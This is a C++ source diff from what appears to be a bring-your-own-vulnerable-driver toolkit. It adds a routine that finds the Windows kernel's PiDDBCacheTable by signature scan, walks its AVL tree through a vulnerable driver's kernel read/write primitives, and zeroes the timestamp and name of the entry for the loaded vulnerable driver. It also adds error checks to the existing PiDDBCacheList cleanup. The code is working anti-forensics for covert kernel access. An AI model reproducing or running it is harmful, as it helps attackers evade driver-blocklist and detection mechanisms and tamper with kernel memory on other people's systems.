@@ -25,7 +25,12 @@ bool VulnTraceCleaner::Cleanup() const
 {
     const auto ntkrnlParser = K32ModuleParser(k32ctx, "ntoskrnl.exe");
     if (!CleanupPiDDBCacheList(ntkrnlParser)) {
-        std::println("[-] Failed to cleanup PiDDBCacheList");
+        std::println("[-] Failed to cleanup vulnerable driver from PiDDBCacheList");
+        return false;
+    }
+
+    if (!CleanupPiDDBCacheTable(ntkrnlParser)) {
+        std::println("[-] Failed to cleanup vulnerable driver from PiDDBCacheTable");
         return false;
     }
 
@@ -49,7 +54,10 @@ bool VulnTraceCleaner::CleanupPiDDBCacheList(const K32ModuleParser& moduleParser
     };
 
     uintptr_t link = 0;
-    k32ctx->GetDriver().ReadMemory(_PiDDBCacheList, &link, sizeof(link));
+    if (!k32ctx->GetDriver().ReadMemory(_PiDDBCacheList, &link, sizeof(link))) {
+        std::println("[-] Failed read head of PiDDBCacheList");
+        return false;
+    }
 
     while (link != _PiDDBCacheList) {
         PiDDBCacheEntry entry { };
@@ -80,4 +88,61 @@ bool VulnTraceCleaner::CleanupPiDDBCacheList(const K32ModuleParser& moduleParser
     }
 
     return true;
+}
+
+bool VulnTraceCleaner::CleanupPiDDBCacheTable(const K32ModuleParser& moduleParser) const
+{
+    static const auto _PiDDBCacheTable = moduleParser.FindAbsoluteAddr("\x48\x8D\x0D\x00\x00\x00\x00\x45\x33\xF6\x48\x89\x44\x24", "xxx????xxxxxxx", 3, 7);
+    if (!_PiDDBCacheTable) {
+        std::println("[-] _PiDDBCacheTable not found");
+        return false;
+    }
+
+    RTL_BALANCED_LINKS balancedRoot = { 0 };
+    if (!k32ctx->GetDriver().ReadMemory(_PiDDBCacheTable, &balancedRoot, sizeof(balancedRoot))) {
+        std::println("[-] Failed to read BalancedRoot");
+        return false;
+    }
+
+    return CleanAvlNode(_PiDDBCacheTable, (uintptr_t)balancedRoot.RightChild);
+}
+
+bool VulnTraceCleaner::CleanAvlNode(uintptr_t baseAddr, uintptr_t nodeAddr) const
+{
+    if (nodeAddr == 0 || nodeAddr == baseAddr) {
+        return false;
+    }
+
+    RTL_BALANCED_LINKS node = { 0 };
+    if (!k32ctx->GetDriver().ReadMemory(nodeAddr, &node, sizeof(node))) {
+        return false;
+    }
+
+    uintptr_t entryAddr = nodeAddr + sizeof(RTL_BALANCED_LINKS);
+
+    PiDDBCacheEntry entry = { 0 };
+    if (!k32ctx->GetDriver().ReadMemory(entryAddr, &entry, sizeof(entry))) {
+        return false;
+    }
+
+    if (entry.TimeDateStamp == k32ctx->GetDriver().GetTimeStamp()) {
+        ULONG zero = 0;
+        k32ctx->GetDriver().WriteMemory(
+            entryAddr + offsetof(PiDDBCacheEntry, TimeDateStamp),
+            &zero, sizeof(zero));
+
+        USHORT zeroLen = 0;
+        k32ctx->GetDriver().WriteMemory(
+            entryAddr + offsetof(PiDDBCacheEntry, DriverName),
+            &zeroLen, sizeof(zeroLen));
+
+        std::println("[+] Vulnerable driver cleaned in PiDDBCacheTable at 0x{:X}", entryAddr);
+        return true;
+    }
+
+    if (CleanAvlNode(baseAddr, (uintptr_t)node.LeftChild)) {
+        return true;
+    }
+
+    return CleanAvlNode(baseAddr, (uintptr_t)node.RightChild);
 }
